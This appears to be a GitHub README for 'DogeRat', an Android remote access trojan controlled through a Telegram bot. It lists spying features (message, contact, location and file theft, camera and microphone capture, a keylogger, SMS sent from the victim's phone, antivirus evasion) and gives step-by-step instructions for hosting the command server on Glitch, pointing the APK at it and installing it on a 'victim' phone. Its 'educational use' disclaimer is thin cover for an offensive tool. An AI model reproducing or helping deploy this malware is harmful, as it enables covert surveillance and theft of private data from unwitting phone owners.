![Logo](https://dogelina.com/dogs/logo.png)

[![instagram](https://img.shields.io/badge/CONTACT-TELEGRAM-blue)](https://t.me/CyberShieldX)
[![instagram](https://img.shields.io/badge/CONTACT-INSTAGRAM-red)](https://instagram.com/CyberShieldX)

#                     DOGERAT

A multifunctional Telegram based Android RAT  without port forwarding.
- VIDEO TUTORIALS  AVIALBLE HERE
https://shivaya-dav.github.io/dogeweb/
## Panel Screenshot
![Logo](https://dogelina.com/dogs/scr.jpg)
## Features
 - 🔴 Real time
- 🌐 custom web view
- 🔔 notification reader
- 🔔 notification sender (send custom notification that apper on target device with custom click link)
- 🗨️ show toast message on target device (Toasts are messages that appear in a box at the bottom of the device)
- 📡 receive information about simcard provider
- 📳 vibrate target device
- 🛰️ receive device location
- ✉️ receive all target message
- ✉️ send sms with target device to any number
- ✉️ send sms with target device to all of his/her contacts
- 👤 recive all target contacts
- 💻 receive list of all installedd apps in target device
- 📁 receive any file or folder from target device
- 📁 delete any file or folder from target device
- 📷 capture main and front camera
- 🎙 capture microphone (with custom duration)
- 📋 receive last clipboard text
- ✅️ auto start after device boot
- 🔐 Keylogger {Availbe in apk v1 and v2}
- ✨ Beautiful telegram bot interface
-🤖 Undetectable by antivirus
## Requirements
 - Glitch Account
 - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
[ApkTool Editor](https://dogelina.com/dogs/apkeditor.apk) ( for Android)



NOTE : USE APK V1 AND V2 WITH OLD SERVER CODE

## How to use
- Search  BotFather on Telegram
![App Screenshot](https://dogelina.com/dogs/1.jpg)
- Creat a bot with any name/username
![App Screenshot](https://dogelina.com/dogs/2.jpg)
- Copy your Bot token
![App Screenshot](https://dogelina.com/dogs/3.jpg)
- Go to glitch.com click
- new project then glitch-hello-node
![App Screenshot](https://dogelina.com/dogs/4.jpg)
- Delete all pre-available files {clcik on 3 dots}
- click on files and upload package.json, server.js
![App Screenshot](https://dogelina.com/dogs/5.jpg)
- Paste your bot token in line 16 {beetwen ''}
![App Screenshot](https://dogelina.com/dogs/6.jpg)
- Paste your chat id in line 15 
- (search userinfobot on telegram and send any msg you will
- get your chatid
![App Screenshot](https://dogelina.com/dogs/7.jpg)
- click on previvew availble on bottom
- open in new window
![App Screenshot](https://dogelina.com/dogs/8.png)
- if you see this type then copy url and close all tabs
![App Screenshot](https://dogelina.com/dogs/9.jpg)
- now open Apkeditor select apk 
- go to following directory
![App Screenshot](https://dogelina.com/dogs/10.jpg)
![App Screenshot](https://dogelina.com/dogs/11.jpg)
- paste your glitch url 
```bash  
  { 
  "host": "https://xxxx.glitch.me/", 
  "socket": "wss://xxxx.glitch.me/", 
  "webView": "https://google.com/" 
}
```
- note: In webview you can add any website 
- when victim will open apk given website will be open in apk
- must replace https to wss
- click on save, and go back
![App Screenshot](https://dogelina.com/dogs/12.jpg)
- clcik on smail and wait 3/4 second
- Now build the apk
- and install in any phone
![App Screenshot](https://dogelina.com/dogs/13.jpg)
- now go to BotFather clcik on your botusername
 - start your bot 
 - now you can monitor all device who will install the apk
![App Screenshot](https://dogelina.com/dogs/15.jpg)

### ❤️Thank you Supporters❤️
[![Stargazers repo roster for @shivaya-dav/DogeRat](https://reporoster.com/stars/dark/shivaya-dav/DogeRat)](https://github.com/shivaya-dav/DogeRat/stargazers)
## 🔗 CONTACT
[![instagram](https://img.shields.io/badge/CONTACT-TELEGRAM-blue)](https://t.me/CyberShieldX)
[![instagram](https://img.shields.io/badge/CONTACT-INSTAGRAM-red)](https://instagram.com/CyberShieldX)


## Disclaimer

Devolper Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.
Dogerat is built for both Educational and Internal use ONLY.
- Make sure the instagram username is @shvaya.dav and Telegram shivaya_dav beware from scam



## ALCOHOL SUPPORT 
!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)
- Bitcoin
- 1LeLwYyDHu51875aenZaNcEnMrEbHwEKJd
- Usdt trc20
- TWX456AoupoYKwCYUKk3ZMWJtNJZRRHnrp
